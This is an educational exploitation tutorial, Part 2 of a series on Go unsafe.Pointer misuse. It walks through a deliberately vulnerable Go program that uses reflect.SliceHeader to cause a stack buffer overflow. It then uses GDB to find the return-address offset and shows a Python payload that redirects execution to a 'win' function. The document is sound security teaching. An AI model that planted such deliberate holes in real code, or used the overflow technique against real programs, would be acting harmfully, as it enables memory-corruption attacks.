# Exploitation Exercise with Go unsafe.Pointer: Code Flow Redirection (Part 2)

In this second part, we will evolve from reading memory to redirecting the code flow. This means we will be controlling
what is being executed. 


## Parts:

 1. [Information leakage](unsafe-vulnerabilities-1-information-leakage.md)
 2. Code flow redirection (enjoy!)
 3. [ROP and spawning a shell](unsafe-vulnerabilities-3-rop-and-spawning-a-shell.md)


## Buffer overflow, part 2: controlling the return address

In the first part we learned that local variables are located on the stack at addresses just below the return address.
When the function returns, it will increment the stack pointer to the point where no space for local variables is used,
effectively freeing them. This means the stack pointer `$rsp` will then point to the stored return address.

Now comes the `ret` machine instruction. It is actually equivalent to `pop $rip` or even `mov $rip, [$rsp]; add $rsp, 8`.
The processor will fetch the address stored on the top of the stack, put it into the instruction pointer register, and
continue execution at that address.

If we can somehow change the return address stored on the stack to an address we can control, we can change the program
control flow. 


## Code flow redirection POC

To see how we can actually exploit this, we will have a look at a proof of concept exploit with an example program.

First, we add a `win` function to be compiled into the binary. This is so that we have a target to redirect the code 
flow to. This is a good first step in code flow exploitation. The function does not do very much, it simply prints 
"win!" so that we know we did good:

```go
func win() {
    fmt.Println("win!")
}
```

The main function of the program looks like this: 

```go
// initialize the reader outside of the main function to simplify POC development, as there are less local variables
// on the stack.
var reader = bufio.NewReader(os.Stdin)

func main() {
    // this is a harmless buffer, containing some harmless data
    harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}
    
    // create a slice of length 512 byte, but assign the address of the harmless data as its buffer.
    // use the reflect.SliceHeader to change the slice
    confusedSlice := make([]byte, 512)
    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&confusedSlice))
    harmlessDataAddress := uintptr(unsafe.Pointer(&(harmlessData[0])))
    sliceHeader.Data = harmlessDataAddress
    
    // now read into the confused slice from STDIN. This is not quite as bad as a gets() call in C, but almost. The
    // function will read up to 512 byte, but the underlying buffer is only 8 bytes. This function is the complete
    // vulnerability, nothing else needed
    _, _ = reader.Read(confusedSlice)
}
```

There is a buffer of length 8 bytes with some harmless data. It is created as a local variable, which means it will live
on the stack at an address a bit lower than the return address.

Next, we will simulate an almost as bad coding practice as calling the `gets()` function in a C code. We will
deliberately create a buffer overflow vulnerability. Recall that Go has some safety features that prevent buffer
overflows, so for this to work we are using the `unsafe.Pointer` type.

We initialize a slice with initial length and capacity 512 bytes. The slice is actually placed on the heap, not the
stack, but that is irrelevant for the vulnerability. Next, using the `reflect.SliceHeader` structure we can extract
the slice header data structure that Go uses internally to represent the slice. It looks like this:

```go
type SliceHeader struct {
	Data uintptr
	Len  int
	Cap  int
}
```

The length and capacity are 512 in this case, and Data is a pointer to the underlying array that contains the elements
in the slice. Now, using the magic of unsafe pointers we can obtain the address of the 8 byte harmless buffer, cast it
into a `uintptr` address value and replace the Data pointer with that address. This way, the slice will now point to the
small buffer as its underlying array, but the length will still be set to 512 bytes. 

This is a misuse of the `unsafe` package and it creates a very dangerous situation: Calling `reader.Read()` in the next
statement will fill the slice with data from standard input, but the function thinks it is safe to read up to 512 bytes
while the underlying array is only 8 bytes long. This is not the completely identical to the unbounded `gets()` call,
but the effect is the same as the confused slice is more than long enough to provide an attack surface.


## Crafting a binary exploit

Now, how can we use this buffer overflow vulnerability and create an actual exploit that will put a meaningful address 
into the stack at exactly the right position to be loaded into the instruction pointer? For this, we will GDB. To make 
debugging a bit easier, install the Python Exploit Development Assistance (PEDA) into GDB. Follow the instructions on 
the [PEDA project page](https://github.com/longld/peda).

Playing around with the program shows an input prompt that reads some data and then seems to just swallow it:

```shell script
$ ./main 
Hello World
$ 
```

However, putting in a large string will crash the program. That is a pretty good hint that there is potential to
exploit a buffer overflow.

```shell script
$ ./main
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4925d1]

goroutine 1 [running]:
runtime.throw(0x4c1077, 0x5)
	/usr/lib/go/src/runtime/panic.go:1112 +0x72 fp=0xc000110f50 sp=0xc000110f20 pc=0x42ebd2
runtime.sigpanic()
	/usr/lib/go/src/runtime/signal_unix.go:694 +0x3cc fp=0xc000110f80 sp=0xc000110f50 pc=0x4429dc
runtime: unexpected return pc for main.main called from 0x4141414141414141
stack: frame={sp:0xc000110f80, fp:0xc000110f88} stack=[0xc000110000,0xc000111000)
000000c000110e80:  0000000000000001  0000000000000000 
000000c000110e90:  000000c000110ed0  0000000000430404 <runtime.gwrite+164> 
000000c000110ea0:  0000000000000002  00000000004c0dd6 
000000c000110eb0:  0000000000000001  0000000000000001 
000000c000110ec0:  000000c000110f3d  0000000000000003 
000000c000110ed0:  000000c000110f20  0000000000430c28 <runtime.printstring+120> 
000000c000110ee0:  000000000042ed97 <runtime.fatalthrow+87>  000000c000110ef0 
000000c000110ef0:  0000000000458580 <runtime.fatalthrow.func1+0>  000000c000000180 
000000c000110f00:  000000000042ebd2 <runtime.throw+114>  000000c000110f20 
000000c000110f10:  000000c000110f40  000000000042ebd2 <runtime.throw+114> 
000000c000110f20:  000000c000110f28  0000000000458500 <runtime.throw.func1+0> 
000000c000110f30:  00000000004c1077  0000000000000005 
000000c000110f40:  000000c000110f70  00000000004429dc <runtime.sigpanic+972> 
000000c000110f50:  00000000004c1077  0000000000000005 
000000c000110f60:  4141414141414141  0000000000000000 
000000c000110f70:  4141414141414141  00000000004925d1 <main.main+177> 
000000c000110f80: <4141414141414141 >4141414141414141 
000000c000110f90:  4141414141414141  4141414141414141 
000000c000110fa0:  4141414141414141  4141414141414141 
000000c000110fb0:  4141414141414141  4141414141414141 
000000c000110fc0:  4141414141414141  4141414141414141 
000000c000110fd0:  4141414141414141  4141414141414141 
000000c000110fe0:  4141414141414141  4141414141414141 
000000c000110ff0:  4141414141414141  4141414141414141 
main.main()
	/home/johannes/studium/s14/masterarbeit/code/exploits/code-injection/main.go:28 +0xb1 fp=0xc000110f88 sp=0xc000110f80 pc=0x4925d1
```

In the resulting stack trace, we can even see a lot of `0x41` values, which is the ASCII value for the letter `A`.

It is time to debug the program with GDB and see where the instruction pointer actually points to after the function
return. This way, we can adjust the number of bytes that we need to scramble into the program before we can put our
exploit payload, overwriting the return address on the stack.

To do this, I create a Python script to produce the exploit payload:

```python
#!/usr/bin/env python2

pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"
print(pattern)
```

The pattern consists of letters in descending order. This is a pattern that is easily recognizable in the hex outputs
of GDB and really useful to determine the return address offset on the stack.

In GDB, start the program like this:

```gdb
gdb-peda$ run <<<$(./exploit_win.py)
[...]
Stopped reason: SIGSEGV
0x00000000004925d1 in main.main () at main.go:28
```

We pipe the output of the exploit script into the program, and we see that the program receives a `SIGSEGV` segmentation
fault signal. This signal means that the processor tried to read or write data at an invalid address, here it's because
it tried to execute the `ret` instruction and jump to an address that is determined by our ASCII characters. To see
which address the CPU would jump to, we need to look at the top of the stack:

```gdb
gdb-peda$ x/8wx $rsp
0xc000068f80:	0x4f4f4f4f	0x50505050	0x51515151	0x52525252
0xc000068f90:	0x53535353	0x54545454	0x55555555	0x56565656
```

Using the `x` command, we inspect 8 words of data (each word is 4 bytes in GDB) and print them in hexadecimal form. The
first two blocks (8 bytes) are the 64-bit processor word that the CPU wants to put into the `$rip` register. We can see
that it is `0x4f4f4f4f50505050`. Looking at the ASCII table, we see that it corresponds to `OOOOPPPP`, and therefore
we need to cut the padding just before the O's and replace those eight characters with the address we want to jump to.

Just before closing GDB, let's quickly use it to find the address of our specially crafted `win` function. First, try
to directly access its address:

```shell script
gdb-peda$ x main.win
No symbol "main.win" in current context.
``` 

We see that there doesn't seem to be any function called win. This is because the Go compiler decided to inline the
function (we can see the inlining decisions by compiling with `go build -gcflags='-m'`). Let's instead just directly
jump to the address of the print call that will show us the win message. We search for it in the disassembly of the
main function:

```gdb
gdb-peda$ disassemble main.main
Dump of assembler code for function main.main:
   0x0000000000492520 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff8
   0x0000000000492529 <+9>:	cmp    rsp,QWORD PTR [rcx+0x10]
   0x000000000049252d <+13>:	jbe    0x49262d <main.main+269>
   0x0000000000492533 <+19>:	sub    rsp,0x78
   0x0000000000492537 <+23>:	mov    QWORD PTR [rsp+0x70],rbp
   0x000000000049253c <+28>:	lea    rbp,[rsp+0x70]
   0x0000000000492541 <+33>:	mov    rax,QWORD PTR [rip+0x48e10]        # 0x4db358
   0x0000000000492548 <+40>:	mov    QWORD PTR [rsp+0x40],rax
   0x000000000049254d <+45>:	lea    rax,[rip+0xe82c]        # 0x4a0d80
   0x0000000000492554 <+52>:	mov    QWORD PTR [rsp],rax
   0x0000000000492558 <+56>:	mov    QWORD PTR [rsp+0x8],0x200
   0x0000000000492561 <+65>:	mov    QWORD PTR [rsp+0x10],0x200
   0x000000000049256a <+74>:	call   0x443670 <runtime.makeslice>
   0x000000000049256f <+79>:	mov    rax,QWORD PTR [rsp+0x18]
   0x0000000000492574 <+84>:	mov    QWORD PTR [rsp+0x58],rax
   0x0000000000492579 <+89>:	mov    QWORD PTR [rsp+0x60],0x200
   0x0000000000492582 <+98>:	mov    QWORD PTR [rsp+0x68],0x200
   0x000000000049258b <+107>:	lea    rax,[rsp+0x40]
   0x0000000000492590 <+112>:	mov    QWORD PTR [rsp+0x58],rax
   0x0000000000492595 <+117>:	mov    rax,QWORD PTR [rip+0xd3ce4]        # 0x566280 <main.reader>
   0x000000000049259c <+124>:	mov    QWORD PTR [rsp],rax
   0x00000000004925a0 <+128>:	mov    rax,QWORD PTR [rsp+0x58]
   0x00000000004925a5 <+133>:	mov    QWORD PTR [rsp+0x8],rax
   0x00000000004925aa <+138>:	mov    QWORD PTR [rsp+0x10],0x200
   0x00000000004925b3 <+147>:	mov    QWORD PTR [rsp+0x18],0x200
   0x00000000004925bc <+156>:	call   0x46b740 <bufio.(*Reader).Read>
   0x00000000004925c1 <+161>:	cmp    BYTE PTR [rsp+0x40],0x2a
   0x00000000004925c6 <+166>:	je     0x4925d2 <main.main+178>
   0x00000000004925c8 <+168>:	mov    rbp,QWORD PTR [rsp+0x70]
   0x00000000004925cd <+173>:	add    rsp,0x78
=> 0x00000000004925d1 <+177>:	ret    
   0x00000000004925d2 <+178>:	nop
   0x00000000004925d3 <+179>:	xorps  xmm0,xmm0
   0x00000000004925d6 <+182>:	movups XMMWORD PTR [rsp+0x48],xmm0
   0x00000000004925db <+187>:	lea    rax,[rip+0xe65e]        # 0x4a0c40
   0x00000000004925e2 <+194>:	mov    QWORD PTR [rsp+0x48],rax
   0x00000000004925e7 <+199>:	lea    rax,[rip+0x491b2]        # 0x4db7a0
   0x00000000004925ee <+206>:	mov    QWORD PTR [rsp+0x50],rax
   0x00000000004925f3 <+211>:	mov    rax,QWORD PTR [rip+0xd3c9e]        # 0x566298 <os.Stdout>
   0x00000000004925fa <+218>:	lea    rcx,[rip+0x4a95f]        # 0x4dcf60 <go.itab.*os.File,io.Writer>
   0x0000000000492601 <+225>:	mov    QWORD PTR [rsp],rcx
   0x0000000000492605 <+229>:	mov    QWORD PTR [rsp+0x8],rax
   0x000000000049260a <+234>:	lea    rax,[rsp+0x48]
   0x000000000049260f <+239>:	mov    QWORD PTR [rsp+0x10],rax
   0x0000000000492614 <+244>:	mov    QWORD PTR [rsp+0x18],0x1
   0x000000000049261d <+253>:	mov    QWORD PTR [rsp+0x20],0x1
   0x0000000000492626 <+262>:	call   0x48bf10 <fmt.Fprintln>
   0x000000000049262b <+267>:	jmp    0x4925c8 <main.main+168>
   0x000000000049262d <+269>:	call   0x459ae0 <runtime.morestack_noctxt>
   0x0000000000492632 <+274>:	jmp    0x492520 <main.main>
End of assembler dump.
```

It might not be completely obvious where the function starts, but given the call to win that we added to stop the
compiler from removing the function altogether was inside an if-statement, it is reasonable that the function would
be at the target of some conditional jump instruction (`je` in line <+161> here): it is at line <+178>, starting with
a NOP instruction. Skipping the NOP, we can use line <+179> or address `0x00000000004925d3` as target.

So let's update the exploit code to use the correct padding and the target address:

```python
#!/usr/bin/env python2

import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
win_p = struct.pack("Q", 0x4925d3)

print(padding + win_p)
```

Running the program creates with this input the following output:

```shell script
$ ./exploit_win.py | ./main
win!
unexpected fault address 0xc000072000
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x2 addr=0xc000072000 pc=0xc000072000]

goroutine 1 [running]:
runtime.throw(0x4c1077, 0x5)
	/usr/lib/go/src/runtime/panic.go:1112 +0x72 fp=0xc000070fd8 sp=0xc000070fa8 pc=0x42ebd2
runtime: unexpected return pc for runtime.sigpanic called from 0xc000072000
stack: frame={sp:0xc000070fd8, fp:0xc000071008} stack=[0xc000070000,0xc000071000)
000000c000070ed8:  000000c000070fbc  000000c000070f18 
000000c000070ee8:  000000000043023b <runtime.recordForPanic+299>  0000000000590565 
000000c000070ef8:  00000000004c0dd6  0000000000000001 
000000c000070f08:  0000000000000001  0000000000000000 
000000c000070f18:  000000c000070f58  0000000000430404 <runtime.gwrite+164> 
000000c000070f28:  0000000000000002  00000000004c0dd6 
000000c000070f38:  0000000000000001  0000000000000001 
000000c000070f48:  000000c000070fbc  000000000000000c 
000000c000070f58:  000000c000070fa8  0000000000430c28 <runtime.printstring+120> 
000000c000070f68:  000000000042ed97 <runtime.fatalthrow+87>  000000c000070f78 
000000c000070f78:  0000000000458580 <runtime.fatalthrow.func1+0>  000000c000000180 
000000c000070f88:  000000000042ebd2 <runtime.throw+114>  000000c000070fa8 
000000c000070f98:  000000c000070fc8  000000000042ebd2 <runtime.throw+114> 
000000c000070fa8:  000000c000070fb0  0000000000458500 <runtime.throw.func1+0> 
000000c000070fb8:  00000000004c1077  0000000000000005 
000000c000070fc8:  000000c000070ff8  00000000004429dc <runtime.sigpanic+972> 
000000c000070fd8: <00000000004c1077  0000000000000005 
000000c000070fe8:  0000000000000000  000000c000072000 
000000c000070ff8:  0000000000000000 
runtime.sigpanic()
	/usr/lib/go/src/runtime/signal_unix.go:694 +0x3cc fp=0xc000071008 sp=0xc000070fd8 pc=0x4429dc
```

Quite obvious from the big stack trace, we see that the program crashed. But more importantly, we see the `win!` output
right at the top, which means that the `win` function was indeed executed. We don't actually care about the program
crash, the objective was to decide which code should be executed and this was successful!


Continue reading with [Part 3: ROP and spawning a shell](unsafe-vulnerabilities-3-rop-and-spawning-a-shell.md)